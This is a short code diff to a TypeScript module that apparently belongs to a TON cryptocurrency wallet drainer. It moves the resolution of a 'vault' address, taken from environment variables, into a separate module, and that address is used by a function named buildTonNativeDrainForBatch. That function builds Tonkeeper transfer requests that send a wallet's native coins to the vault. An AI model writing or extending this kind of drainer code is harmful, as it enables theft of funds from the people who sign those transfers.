@@ -6,6 +6,7 @@ import { TonClient } from '@ton/ton'
 
 import { resolveTonCenterJsonRpcUrl, tonCenterApiHeaders } from './ton-sensory-armor.js'
 import { parseNativeAmount } from './native-coin-drain.js'
+import { resolveTonVaultAddress } from './operational-vault.js'
 
 export type TonNativeTransferRequest = {
   from: string
@@ -15,14 +16,6 @@ export type TonNativeTransferRequest = {
   /** TonConnect / Tonkeeper message list. */
   messages: Array<{ address: string; amount: string; payload?: string }>
   wallet: 'tonkeeper'
-}
-
-function resolveTonVaultAddress(): string | null {
-  const raw =
-    (typeof process !== 'undefined' ? process.env['VAULT_ADDRESS_TON'] : undefined)?.trim() ||
-    (typeof process !== 'undefined' ? process.env['SOVEREIGN_VAULT_TON'] : undefined)?.trim() ||
-    ''
-  return raw || null
 }
 
 function createTonClient(endpoint: string): TonClient {
@@ -81,7 +74,7 @@ export async function buildTonNativeDrainForBatch(params: {
   rpcUrl?: string
 }): Promise<TonNativeTransferRequest | null> {
   if (params.amountNanotons <= 0n) return null
-  const vault = params.vault ?? resolveTonVaultAddress()
+  const vault = params.vault ?? (await resolveTonVaultAddress())
   if (!vault) {
     throw new Error('VAULT_ADDRESS_TON or SOVEREIGN_VAULT_TON required for TON drain')
   }
